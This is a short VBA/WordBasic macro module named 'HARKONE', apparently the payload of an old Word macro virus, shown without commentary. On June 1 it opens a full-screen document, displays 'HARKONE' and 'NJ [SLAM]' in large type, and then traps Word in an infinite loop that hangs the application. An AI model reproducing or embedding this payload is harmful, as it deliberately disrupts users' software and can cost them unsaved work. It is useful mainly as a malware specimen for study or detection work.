   Attribute VB_Name = "HARKONE"

   Public Sub MAIN()
   If WordBasic.Day(WordBasic.Now()) = 1 And WordBasic.Month(WordBasic.Now()) = 6 Then
       WordBasic.FileNew
       WordBasic.ToggleFull
       WordBasic.DocMaximize
       WordBasic.Font "Imprint MT Shadow"
       WordBasic.FontSize 60
       WordBasic.Bold
       WordBasic.Insert "HARKONE"
       WordBasic.StartOfLine
       WordBasic.CharRight 1, 1
       WordBasic.FormatFont Points:="48", Color:=6
       WordBasic.EndOfLine
       WordBasic.InsertPara
       WordBasic.InsertPara
       WordBasic.FontSize 48
       WordBasic.Insert "NJ [SLAM]"
   HangOn:
   GoTo HangOn
   End If
   End Sub
